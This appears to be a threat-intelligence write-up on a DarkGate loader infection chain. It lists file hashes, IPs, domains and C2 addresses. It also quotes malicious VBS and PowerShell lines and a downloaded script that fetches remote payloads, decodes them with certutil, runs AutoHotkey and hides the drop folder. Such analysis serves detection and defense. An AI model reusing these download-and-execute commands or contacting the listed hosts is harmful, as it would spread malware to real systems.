THREAT IDENTIFICATION: DARKGATE LOADER

INFECTION FLOW
xlsx -> link to vbs file -> powershell scripts -> ahk -> dll -> C2

XLSX FILE HASHES
march-D2317-2024.xlsx
3dff510e3ae37d39e04c15f0f411cf43
(All files I saw were named: "march-D[0-9]{4}-2024.xlsx")

XLSX FILE BUTTON HYPERLINK
\\64.226.97.86\share\EXCEL_OPEN_DOC.vbs

RETRIEVED WITH:
file:///\\64.226.97.86\share\EXCEL_OPEN_DOC.vbs"

VBS SCRIPT FILE HASH
EXCEL_OPEN_DOC.vbs
e9da2f1fbf627a05811cf294a1136a64

RELEVANT PART OF THE VBS SCRIPT
ppbfjlcz = "-Command Invoke-Expression (Invoke-RestMethod -Uri 'nextroundst.com/kqcmvqtj')"
  on error resume next

    set oError = CreateObject("WbemScripting.SWbemLastError")

    if Err = kErrorSuccess then

        wscript.echo L_Operation_Text            & L_Space_Text & oError.Operation
        wscript.echo L_Provider_Text             & L_Space_Text & oError.ProviderName
        wscript.echo L_Description_Text          & L_Space_Text & oError.Description
        wscript.echo L_Text_Error_General04_Text & L_Space_Text & oError.StatusCode

    end if
CreateObject(jhempplk).ShellExecute vcnaecac, ppbfjlcz ,"","",0

INTERCEPTED POWERSHELL SCRIPT
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command Invoke-Expression (Invoke-RestMethod -Uri 'nextroundst.com/kqcmvqtj')

URLS FROM PCAP TRAFFIC 
http://nextroundst.com/kqcmvqtj
http://nextroundst.com/aa
http://nextroundst.com/ffcxlohx
http://nextroundst.com/nlcsphze

DOWNLOADED SCRIPT FILE HASH
kqcmvqtj
f3fcf6e83baf14571d2075dee7493593

DOWNLOADED SCRIPT CONTENTS (kqcmvqtj)
ni 'C:/st' - Type Directory - Force;
cd 'C:/st';
Invoke - WebRequest - Uri "http://nextroundst.com/aa" - OutFile 'a.bin';
certutil - decodehex a.bin AutoHotkey.exe;
Invoke - WebRequest - Uri "http://nextroundst.com/ffcxlohx" - OutFile 'script.ahk';
Invoke - WebRequest - Uri "http://nextroundst.com/nlcsphze" - OutFile 'test.txt';
start 'AutoHotkey.exe' - a 'script.ahk';
attrib + h 'C:/st'

DOWNLOADED BINARY FILE HASH
a.bin
bf88d228baec74c7928df463db0f0fdc
(Same as the downloaded file named: aa )

LEGITIMATE AUTOHOTKEY BINARY FILE HASH
AutoHotkey.exe
a59a2d3e5dda7aca6ec879263aa42fd3

AUTOHOTKEY SCRIPT FILE HASH
script.ahk
2e319e5e6ab619a01eb3b95cd11c8143
(Same as the downloaded file named: ffcxlohx )

HEX ENCODED DARKGATE FILE HASH
test.txt
f5a710f2471af13c14c80b190081b93e
(This file contains a large hex-encoded data blob)

UNPACKED PAYLOAD FILE HASH
47f0b3d.exe
4278eb3c85338caceb19183b89368796

DARKGATE C2s
POST http://nextroundst.com/
204.93.201.142


OBSERVED STRINGS IN MEMORY
C:\ProgramData\bcdkfhd\bbdaaah.ahk
C:\ProgramData\bcdkfhd\gagahfe\14-03-2024.log


